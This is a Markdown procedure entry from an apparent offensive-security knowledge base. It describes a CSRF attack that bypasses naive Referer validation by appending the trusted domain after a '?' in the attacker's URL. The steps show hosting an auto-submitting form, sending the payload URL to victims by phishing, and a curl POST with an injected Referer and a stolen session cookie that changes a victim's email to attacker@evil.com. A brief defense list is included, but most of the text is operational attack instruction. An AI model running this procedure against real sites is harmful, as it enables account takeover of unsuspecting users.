---
id: 103a6e34-8e0e-4429-8cbb-4296046d1896
name: csrf-referer-bypass-with-question-mark-injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:55.624747+00:00'
updated_at: '2024-10-01T00:00:00Z'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
tags:
  - '[[tags/Bypass referer header validation]]'
  - '[[tags/Cross-Site Request Forgery]]'
  - '[[tags/With question mark(`?`) payload]]'
commands:
  - '[[commands/start-simple-web-server]]'
  - '[[commands/curl-fetch-csrf-page]]'
  - '[[commands/curl-post-csrf-with-injected-referer]]'
platforms:
  - Web
tools: []
validated: true
---

# CSRF Referer Bypass with Question Mark Injection

## Summary

This procedure outlines how to execute a Cross-Site Request Forgery (CSRF) attack by bypassing Referer header validation through injecting the trusted domain after a question mark in the Referer value. The technique exploits applications with simplistic Referer checks that perform string matching without proper URL parsing, allowing unauthorized actions like account modifications when a victim loads a malicious page.

## Description

CSRF attacks trick authenticated users into submitting unintended requests to a trusted site. Referer header validation is a common defense, but it can be bypassed by crafting a Referer value such as "https://attacker.com/csrf.html?https://trusted.domain.com". If the application checks for the presence of "trusted.domain.com" without accounting for the query string separator (?), the request appears valid. This procedure covers hosting a malicious auto-submitting HTML page, crafting the injected URL, and testing the bypass. It targets web applications vulnerable to weak origin validation, leading to actions like password resets or data changes on the victim's behalf. The attack requires social engineering to lure the victim to the payload URL while logged in.

## Requirements

1. Attacker-controlled web server (e.g., local or remote domain) to host the malicious HTML.
2. Knowledge of the target's CSRF-vulnerable endpoint, required POST parameters, and session cookie format.
3. Python 3 installed for simple server hosting.
4. Curl for testing requests.
5. For full attack: Victim must be authenticated to the target site.

## Defense

- Implement unique CSRF tokens per request and validate them server-side.
- Set cookies with SameSite=Strict to block cross-site usage.
- Strictly parse and validate the Referer header's origin (scheme, host, port) using libraries like Python's urllib.parse.
- Require multi-factor authentication for sensitive operations.
- Log and monitor anomalous Referer headers containing unexpected query parameters.

## Objectives

1. Host and serve a malicious auto-submitting form to trigger the CSRF request.
2. Inject the trusted domain into the Referer via question mark to bypass validation.
3. Execute an unauthorized action (e.g., email change) using the victim's session.

## Instructions

### Step 1: Create the Malicious CSRF HTML Page

**Context**: Build an HTML file with a hidden form that auto-submits to the target endpoint upon loading. This ensures the CSRF request fires immediately in the victim's browser, sending the Referer with the injection.

Create `csrf.html` using the snippet in [[codes/html-csrf-auto-submit-form]]. Replace placeholders like $_TARGET_URL with specifics (e.g., https://trusted.domain.com/account/change-email, new_email=attacker@evil.com).

Expected Output: Valid HTML file with form targeting the endpoint.

### Step 2: Host the CSRF Page

**Context**: Serve the HTML from an attacker-controlled location so the Referer can be controlled via the URL query string.

**Command** ([[commands/start-simple-web-server]]):
```bash
cd $_DIRECTORY && python3 -m http.server $_PORT
```
> Navigate to the directory containing `csrf.html` and start the server. Use port 80 if possible for realism, or 8000 for testing. Why: This exposes the page at http://attacker-ip:port/csrf.html.

Expected Output: "Serving HTTP on 0.0.0.0 port $_PORT (http://[::]:$_PORT/) ..."

### Step 3: Verify the Page is Accessible

**Context**: Ensure the hosted page loads correctly and contains the auto-submit form, preventing delivery failures.

**Command** ([[commands/curl-fetch-csrf-page]]):
```bash
curl "http://$_ATTACKER_IP:$_PORT/csrf.html"
```
> This retrieves the raw HTML. Inspect for the form action and hidden inputs. Why: Confirms hosting works before crafting the payload URL.

Expected Output: HTML response with <form action="$_TARGET_URL"...> and <script> for auto-submit.

### Step 4: Craft and Deliver the Payload URL

**Context**: Append the trusted domain after ? in the URL to inject it into the Referer for the form submission. Decision: If the target uses HTTPS, include https://; otherwise, adjust.

The payload URL: `http://$_ATTACKER_IP:$_PORT/csrf.html?https://$_TARGET_HOST`

Send this URL to the victim via phishing/email. When loaded, the browser's POST to target will have Referer: http://$_ATTACKER_IP:$_PORT/csrf.html?https://$_TARGET_HOST. Why: The query string injection fools naive contains() checks for the domain.

For self-testing (while logged in): Open the URL in your browser.

Expected Output: Page loads briefly, then auto-submits (check target site for action completion).

### Step 5: Test the Bypass Manually with Curl

**Context**: Simulate the browser request to validate the bypass without relying on a victim. Use your session cookie from a logged-in browser session.

**Command** ([[commands/curl-post-csrf-with-injected-referer]]):
```bash
curl -v -X POST \
  -H "Referer: http://$_ATTACKER_IP:$_PORT/csrf.html?https://$_TARGET_HOST" \
  -H "Cookie: $_SESSION_COOKIE" \
  -d "$_POST_DATA" \
  "https://$_TARGET_HOST/$_ENDPOINT"
```
> Extract $_SESSION_COOKIE from browser dev tools. Set $_POST_DATA to urlencoded params (e.g., new_email=attacker@evil.com). Use -v to inspect sent headers. Why: Directly tests if the injected Referer passes validation.

Expected Output: HTTP 200/302 response; no referer validation error; action reflected in account (e.g., updated profile).

**Success Indicators**:
- Request succeeds without 403/Invalid Referer.
- Target action (e.g., password changed) confirms bypass.
